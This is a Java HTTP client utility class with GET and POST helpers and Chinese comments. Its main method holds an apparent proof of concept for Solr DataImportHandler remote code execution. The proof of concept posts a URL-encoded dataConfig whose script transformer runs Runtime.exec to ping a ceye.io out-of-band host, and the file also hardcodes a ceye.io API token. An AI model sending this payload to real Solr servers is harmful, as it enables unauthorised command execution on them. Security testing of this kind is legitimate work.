package com.hello.tools.net;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;
import com.hello.tools.net.listener.FailedListener;
import com.hello.tools.net.listener.SuccessListener;
import org.apache.http.*;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import java.io.IOException;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class HttpClient45 {

    /**
     * GET请求
     * @throws IOException
     * @param url 请求路径
     * @param headers request请求头
     * @param successListener 成功回调函数
     * @param failedListener 失败回调函数
     */
    public static void get(String url, Map<String,String> headers, SuccessListener successListener, FailedListener failedListener) throws IOException {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet(url);

        //设置request头
        setHeader(httpGet,headers);
        //获取response
        CloseableHttpResponse response = httpclient.execute(httpGet);
        try {
            //HttpEntity.getEntity包含响应头和响应体
            HttpEntity entity = response.getEntity();
            //获取响应状态
            System.out.println(response.getStatusLine());
            if (entity != null){
                successListener.successListener(entity);
            }
            //将会释放所有由httpEntity所持有的资源
            EntityUtils.consume(entity);
        }catch (IOException e) {
            failedListener.failedListener(e);
        } finally {
            response.close();
        }
    }

    /**
     * 带参post请求
     * @param url 请求路径
     * @param headers request请求头
     * @param params 请求体参数(非json)
     * @param successListener 成功回调函数
     * @param failedListener 失败回调函数
     * @throws IOException
     */
    public static void post(String url , Map<String,String> headers,String params, SuccessListener successListener, FailedListener failedListener) throws IOException {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(url);
        //设置request头
        setHeader(httpPost,headers);
        CloseableHttpResponse response = null;
        try {
            //设置请求体内容
            httpPost.setEntity(new StringEntity(params));
            //发送post请求
            response = httpclient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            //获取响应状态
            System.out.println(response.getStatusLine());
            if (entity != null){
                successListener.successListener(entity);
            }
            //释放HttpEntity资源
            EntityUtils.consume(entity);
        } catch (IOException e) {
            failedListener.failedListener(e);
        } finally {
            response.close();
        }
    }

    /**
     *
     * @param url 请求路径
     * @param headers request请求头
     * @param params 请求体参数(json)
     * @param successListener 成功回调函数
     * @param failedListener 失败回调函数
     * @throws IOException
     */
    public static void post(String url , Map<String,String> headers, JSONObject params, SuccessListener successListener, FailedListener failedListener) throws IOException {
        CloseableHttpClient httpclient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(url);
        //设置request头
        setHeader(httpPost,headers);
        CloseableHttpResponse response = null;
        try {
            //设置请求体内容
            StringEntity stringEntity = new StringEntity(JSON.toJSONString(params), "utf-8");
            httpPost.setEntity(stringEntity);
            //发送post请求
            response = httpclient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            //获取响应状态
            System.out.println(response.getStatusLine());
            if (entity != null){
                successListener.successListener(entity);
            }
            //释放HttpEntity资源
            EntityUtils.consume(entity);
        } catch (IOException e) {
            failedListener.failedListener(e);
        } finally {
            response.close();
        }
    }

    /**
     * 设置request请求头
     * @param httpclient    http对象
     * @param headers   请求头map集合
     */
    public static void setHeader(HttpMessage httpclient, Map<String,String> headers){
        if (headers.isEmpty() || headers == null){
            httpclient.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36");
            return;
        }
        Set<Map.Entry<String, String>> entrySet = headers.entrySet();
        Iterator<Map.Entry<String, String>> iter = entrySet.iterator();
        while (iter.hasNext())
        {
            Map.Entry<String, String> entry = iter.next();
            httpclient.setHeader(entry.getKey(),entry.getValue());
        }
    }


    public static void main(String[] args) {
        String url = "http://api.ceye.io/v1/records?token=402621104f2cf77fb945a584c6ab18e6&type=dns&filter=aaa";
        try {
//            Get(url, new SuccessListener() {
//                @Override
//                public void successListener(HttpEntity entity) {
//                    try {
//                        String s = EntityUtils.toString(entity);
//                        System.out.println(s);
//                    } catch (IOException e) {
//                        throw new RuntimeException(e);
//                    }
//                }
//            }, new FailedListener() {
//                @Override
//                public void failedListener(Exception e) {
//                    System.out.println("time out");
//                }
//            });
            post("http://192.168.25.129:8983/solr/test/dataimport?_=1565835261600&indent=on&wt=json", null,"command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22ping%20aaa.s98748.ceye.io%20-c%201%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport", new SuccessListener() {
                @Override
                public void successListener(HttpEntity entity) {
                    try {
                        String s = EntityUtils.toString(entity);
                        System.out.println(s);
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                }
            }, new FailedListener() {
                @Override
                public void failedListener(Exception e) {
                    System.out.println("time out");
                }
            });
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }

}
